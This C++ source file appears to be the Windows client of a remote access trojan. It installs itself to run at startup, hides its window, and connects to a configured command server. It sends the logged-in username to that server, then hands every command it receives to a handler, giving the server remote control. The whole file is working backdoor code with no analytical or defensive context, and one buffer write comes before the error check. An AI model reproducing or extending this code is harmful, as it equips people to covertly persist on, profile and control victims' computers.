#include <iostream>
#include <thread>
#include <chrono>
#include <string>
#include "client-clean.h"

struct sockaddr_in server_info;
SOCKET sock;
WSADATA wsa;

int main(int argc, char const *argv[]) {
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) {
	    printf("Failed. Error Code: %d\n", WSAGetLastError());
	    return 0;
	}

	SaveOnStartUp();

	bool exist = false;
	std::vector<std::string> _infos = readServerInfo();
	if (!_infos.empty()) exist = true;

	std::string server_ip = "";
	int server_port = 0;

	if (!exist) {
	    std::cout << "\n\n[=] Please enter the server credentials\n";
	    std::cout << "[+] Enter server ip: ";
	    std::cin >> server_ip;
	    std::cout << "[+] Enter server port: ";
	    std::cin >> server_port;

		if (saveServerInfo(server_ip, server_port) != -1) {
			std::cout << "[+] Server credenials saved.\n\n";
		} else std::cout << "[!] Failed to save server credenials.\n\n";

	} else {
		char choice;
		std::cout << "\n\n[=] Save server infos found. Using it.\n";
		server_ip = _infos[0];
		server_port = std::stoi(_infos[1]);
		std::cout << "[+] Credentials found: " << server_ip << " " << server_port << "\n\n";
	}

	server_info.sin_family = AF_INET;
	server_info.sin_port = htons(server_port);
	server_info.sin_addr.s_addr = inet_addr(server_ip.c_str());

    // socket creation
	sock = socket(AF_INET, SOCK_STREAM, 0);
	if (sock == INVALID_SOCKET) {
		perror("Socket creation failed");
		WSACleanup();
		return 0;
	}


	// connect to the server
	std::cout << "[+] Connecting now to the server.\n";
	std::this_thread::sleep_for(std::chrono::seconds(3));
	Hide();

	bool is_connected = false;
	int attempts = 0;
	while (!is_connected) {
		int res = connect(sock, (struct sockaddr*)&server_info, sizeof(server_info));

		if (res == 0) {
			std::cout << "[+] Connected to the server.\n";

			char username[1024];
			DWORD username_len = 1024;
			GetUserName(username, &username_len);

			std::string username_str = "username: " + std::string(username);
			int username_str_len = username_str.length();
			std::cout << "[!] Sending this to the server: " << username_str << "\n";
			std::cout << "[!] Length: " << username_str_len << "\n";

			send(sock, username_str.c_str(), username_str_len, 0);

			is_connected = true;
			break;
		} else {
			if (attempts == 20) {
				std::cout << "[!] Failed to connect to the server 20 times. Quitting.\n"; 
				return -1;
			}

			std::cout << "[!] Failed to connect to the server. Trying again.\n"; 
			attempts++;
			std::this_thread::sleep_for(std::chrono::seconds(1));
		}
	}


	while (is_connected) {
		char buffer[1024] = {0};
		int received = recv(sock, buffer, sizeof(buffer)-1, 0);  // Ensure space for null-termination
		buffer[received] = '\0';

		std::string converted = std::string(buffer);

		if (received <= 0) {
			std::string t;
			std::cout << "[!] Server sent this data: " << received << '\n';

			is_connected = false;
			break;
		}

		if (converted == "ping") {
			send(sock, "pong", 4, 0);
		} else HandleCommands(converted, sock);
	}

	std::cout << "[!] Disconnected from the server" << '\n';
	closesocket(sock);
	exit(1);

	return 0;
}